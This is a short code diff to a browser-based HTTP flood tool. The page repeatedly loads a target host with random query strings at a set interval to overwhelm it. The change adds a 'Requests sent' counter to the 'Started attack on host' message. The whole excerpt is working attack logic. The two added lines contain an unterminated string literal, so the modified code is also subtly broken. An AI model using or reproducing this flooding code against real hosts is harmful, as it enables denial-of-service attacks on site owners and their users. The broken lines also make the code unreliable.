@@ -48,7 +48,7 @@ document.getElementById("msg").innerHTML = "No delay specified.";
 document.getElementById("msg").innerHTML = "No host specified.";
 } else {
 setInterval(serve, delay);
-document.getElementById("msg").innerHTML = "Started attack on host " + host + " with delay " + delay;
+document.getElementById("msg").innerHTML = "Started attack on host " + host + " with delay " + delay + " (Requests sent: " + requests + ");
 }
 }
 
@@ -57,6 +57,7 @@ requests += 1;
 randomIterator = Math.floor(Math.random() * 899999999) + 100000000;
 var sourcer = host + "?x=" + randomIterator;
 document.getElementById("idsd").src = sourcer;
+document.getElementById("msg").innerHTML = "Started attack on host " + host + " with delay " + delay + " (Requests sent: " + requests + ");
 console.log(sourcer);
 }
 </script>
